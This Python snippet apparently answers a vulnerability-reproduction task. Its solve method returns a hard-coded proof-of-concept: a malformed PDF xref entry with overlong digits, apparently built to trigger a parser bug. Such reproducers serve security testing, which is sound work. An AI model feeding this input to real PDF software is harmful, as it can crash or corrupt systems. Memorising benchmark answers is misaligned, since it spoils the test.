class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"xref\n0 1\n0000000000 65535 f" + b"0" * 19 + b"\r\n"
        return poc
